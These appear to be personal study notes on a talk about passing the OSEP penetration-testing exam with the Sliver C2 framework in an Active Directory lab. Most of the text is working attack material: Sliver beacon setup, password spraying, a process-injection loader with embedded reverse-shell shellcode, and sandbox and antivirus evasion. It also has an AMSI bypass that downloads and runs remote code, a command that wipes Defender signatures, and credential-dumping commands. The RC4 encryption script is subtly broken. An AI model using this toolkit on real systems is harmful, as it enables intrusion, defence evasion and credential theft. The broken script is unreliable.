# TALK Ace The OSEP Exam with Sliver Framework


[YouTube - Ace the OSEP Exam with Sliver Framework](https://www.youtube.com/watch?v=YwiSqdIhl9g) description: *"www.bishopfox.com - Penetration testers are perpetual learners, constantly adapting and evolving. To excel in ethical hacking, one must master the art of emulating adversarial tactics in the most cutting-edge ways. Offensive security certifications serve as a testament to an ethical hacker's expertise, but with countless options and complex exams, how does one succeed? Tune in to learn how our senior security expert, Jon Guild, set himself up for success to pass the esteemed OSEP exam. Listen in to hear Jon’s first-hand experience using Bishop Fox’s Sliver C2 framework to practice pivoting, enumeration, lateral movement, and escalation in an ideal vulnerable lab environment. Jon will offer actionable tips and tricks to enhance your own preparedness for offensive security certification exams. Don't miss out on this opportunity to excel in the world of penetration testing. During this livestream, our senior security expert will share expertise on: • Using Sliver to prepare for and pass the OSEP exam • Developing and refining technical methodologies for exam success • Soft skills to make the most of study sessions and exam preparation"*

Including snippets and information from the blog post [bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)

- Cybernetics HTB Labs for OSEP exam
- 80GBs and https://github.com/Orange-Cyberdefense/GOAD
- Build your own AD Lab
- Know your toolset. Do the CRTO 
- Have a reevaluation period
- Pass Exam, do not care about OPSEC care for the obtaining of flags 
- GitHub has a lot of awesome repositories! Make sure whatever you decide to use, you understand what it is doing and how you can modify it if needed.
- MalDev Academy
- HTB Academy Kerberos
- [[Sliver]]

- [[Active-Directory-Certificate-Services]] is very prominent in more modern 2023+ environment, check for the big lateral movement wins. 
- ChatGPT Games of Throne Username lists; the YouTube is based on DOAD, the exam report and exam may still have restrictions on AI Chat Bot usage.  


```
sliver > profiles new beacon --mtls 192.168.56.1:443 --format shellcode goad-shellcode-beacon
sliver > stage-listener -u tcp://192.168.56.1:8080 -p goad-shellcode-beacon
sliver > mtls -L 192.168.56.1 -l 443
```

General [[Active-Recon]] enumeration with `nmap`, `crackmapexec` 

Next check for [[ASREP-Roasting]]

Try Hodor:Hodor - to hold open some doors; surprising effective in corporate environments  
```bash
crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success --no-brute
```

Impacket - [[Impacket-Cheatsheet]] is invaluable.
```bash
impacket-GetNPUsers -dc-ip $ip $domain.$tld/ -usersfiles users.txt -format hashcat 
```

[[AD-CS-Hacking]] with [[Crackmapexec-Cheatsheet]], Jon does these after first domain user
```bash
crackmapexec ldap -u $user -p $pass -M adcs 
```

Jon notes the importance of some of the LDAP modules 
```bash
crackmapexec ldap -L
enum_trusts
laps
maq # machineAccountQuota how many machine accounts a user can make; Default is 10 machines
```

Jon notes that some of the course material the C\# tooling and compiling workflow, whereas he used `impacket` and `sliver`


[GitHub - chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets): *"A repository with my notable code snippets for Offensive Security's PEN-300 (OSEP) course."*; When Jon refers to Loader he is referring to Process Injection and Migration. Local links to pages:
[[Remote-Process-Memory-Injection]]
[[Windows-Shellcode-Injection]]
[[Malware-Techniques-Process-Hollowing]]
[[Windows-Process-Hollowing]]

Jon recommends MalDev Academy, for building your own he copied:
```c
#include "pch.h" // Do not need this part according to Jon
#include <Windows.h>

int main()
{
	unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x05\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";
	SIZE_T shellSize = sizeof(buf);
	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = {0};

	CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	
	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);	
	ResumeThread(threadHandle);

	return 0;
}
```
From [ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)

- Create a Process in a suspended state with `CREATE_SUSPENDED`
- Get the Process handle 
- Use `VirtualAllocEx` to allocate memory with `PAGE_EXECUTE_READWRITE`
- `WriteProcessMemory()` to Write to Process Memory..
- Queue up User [Asynchronous Procedure Call](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) to then resume the process from its suspended state so that it runs

Then Evade AV and Windows Defender:
- No MSFvenom or known bads
- Host shellcode yourself
- Encode and encrypt shellcode inside the loader itself

Sliver Shellcode is MASSIVE 
```c
extern unsigned char buf; // shellcode.c
extern unsigned int buf_len; // Sliver shellcode is thick
// ...
const char* key = "ntdll.dll" // Encryption key looks benign
```
Reason Windows Defender will flag this is that it is still running the binary. To evade this we can use a timing attack to delay injection so that when Defender performing checks it is checking at the wrong time for Defender to be checking. I have just stylised and removed comments and print statements:
```c
int TimeDelayComparison()
{
	clock_t start_t, end_t;
	double total_t;
	int i = 6;

	start_t = clock();
	Sleep(i * 1000);
	end_t = clock();

	if ((((double)end_t - start_t) / CLOCKS_PER_SEC) < i) {
		exit(0);
	}
	total_t = (double)(end_t - start_t) / CLOCKS_PER_SEC;

	return(0);
}
```
Defender will skip the `Sleep()` function.

```bash
python3 rc4.py -h
python3 rc4.py "ntdll.dll" payload.bin
mv payload.bin.enc buf
# Take the filename and make it the variable for visual studios QoL
# This is CLI equivilent to msfvenom shellcode formating for C 
xxd -i buf > shellcode.c
```

Could not find the rc4 source code so:
```python
import sys

# Thanks to xct and John Guild
# Could not find the xct repository https://github.com/xct :( to credit 
# Was mentioned in Encrypting Shellcode for Sliver Binaryies for OSEP in https://www.youtube.com/watch?v=YwiSqdIhl9g

def rc4(data, key):
    keylen = len(key)
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % keylen]) % 256
        s[i], s[j] = s[j], s[i]

    i = 0 
    j = 0
    encrypted = bytearray()
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        encrypted.append(data[n] * s[(s[i] + s[j]) % 256])

    return encrypted

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./rc4.py <key> <filename>")
        print("xct is awesome")
        exit(0)

    key = sys.argv[1]
    filename = sys.argv[2]

    with open(filename, 'rb') as f:
        data = f.read()

    encrypted = rc4(data, key.encoded())

    with open(f"{filename}.enc", 'wb') as f:
        f.write(encrypted)

    print(f"Written {filename}.enc")

```

[[AMSI-Bypassing]] to download PowerShell code runner
```bash
powershell "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344);IEX (new-object system.net.webclient).downloadstring('http://192.168.56.1:9000/sc.txt')"
```

[[Donut]] shellcode
```
donut /var/www/html/bin/PrintSpoofer64.exe -a 2 -b 2 -o /tmp/payload.bin -p '-c c:\windows\tasks\sph.exe'
```

Nuking AV
```go
execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Execute `sharp-hound-4`; this will fail because we do not have credentials
```go
sharp-hound-4 -- '-c all,GPOLocalGroup'
```

Jon references the HTB academy Kerberos Module and the Double hop problem, but here is the link to the [HackTricks Double Hop Problem](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem) describe this problem as: *"The Kerberos "Double Hop" problem appears when an attacker attempts to use Kerberos authentication across two hops"
- Credential are not stored in Memory so sharp-hound cannot use them

Solution in `sliver` run `rubeus` [[Rubeus-Cheatsheet]]
```powershell
rubeus asktgt /user:$username /password:$pass /domain:$domain.$tld /nowrap
```

Execute a binary from your local file system!
```go
// -M -E is required if we have not disabled AV
// -i in process; sliver requires inprocess or it can only read the first 256 characters
execute-assembly -i -M -E /var/www/html/bin/Rubeus.exe createnetonly /program:C:\\windows\\system32\\cmd.exe /user:$username /password:$pass /domain:$domain.$tld /ticket:$rubeusAskTGTOutput 
```
This should create a process that we can then...

Migrate to different a process!
```go
migrate -p 6969
```

Check if we have tickets and then execute `sharp-hound-4`
```go
execute -o cmd /c klist
sharp-hound-4 -- '-c all,GPOLocalGroup'
```

You can also unhook any hook in DLL, similar to [[Cobalt-Strike]] 
```go
unhook-bof
```

Remember Defender can be temperamental in that it may caught it sometimes, but not other times.

[GitHub icyguider Nimcrypt2](https://github.com/icyguider/Nimcrypt2) can also unhook `ntdll.dll`

Bloodhound does not capture everything from Linux, run from Windows.

I did not copy the Lateral Movement to via [[GenericWrite]], anything new another than using `rubeus arktgt` with a certificate 

[gist Tothi - No-Fix Local Privilege Escalation from low-priviliged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9) references [GitHub cube0x0 KrbRelay](https://github.com/cube0x0/KrbRelay)

Jon does not like manual LDAP queries and recommends [GitHub - ldeep](https://github.com/franc-pentest/ldeep): *"In-depth ldap enumeration utility"*
```bash
ldeep ldap -u $username -p $password -d $domain.$tld -s ldap://$ip delegations
```


Sideload feature of Sliver to create a `donut` file for `mimikatz` without having too manually do it. 
```go
sideload /var/www/html/bin/mimikatz.exe "coffee" "exit"
// -c create machine, because it does not exist
sideload /var/www/html/bin/NimKrbRelayUp.exe 'relay -d $domain.$tld -cn $ComputerName -cp $password -c -cls $CLSID4comObj -p $port'
// Try again and again!
```

`sharpview` or `sharpsh`, to  `Get-DomainGroup "Domain Admins"` from [[PowerView-Cheatsheet]]
```go
// Get-DomainGroup "Domain Admins"
sharpsh -- '-u http://192.168.56.1:9090/PowerView.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='
```

As Domain Admin dump the SAM, SECURITY Registry Hives from the [[Windows-Registry]]
```go
sharpsecdump '' -target=192.168.56.11
```

Use `atexec` from `impacket` - [[Impacket-Cheatsheet]] to 
```bash
impacket-atexec -hashes:"NTML" "$domain.$tld"/"Administrator"@"$ip" "powershell --enc $base64EncodedMethodToGetBeaconAndRecieveTheBacon"
```

## References

[YouTube - Ace the OSEP Exam with Sliver Framework](https://www.youtube.com/watch?v=YwiSqdIhl9g) 
[bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)
[GitHub - chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)
[ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)
[Microsoft.learn - Asynchronous Procedure Call](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
[HackTricks Double Hop Problem](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem)  
[GitHub icyguider Nimcrypt2](https://github.com/icyguider/Nimcrypt2) 
[gist Tothi - No-Fix Local Privilege Escalation from low-priviliged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9) 
[GitHub cube0x0 KrbRelay](https://github.com/cube0x0/KrbRelay)
[GitHub - ldeep](https://github.com/franc-pentest/ldeep)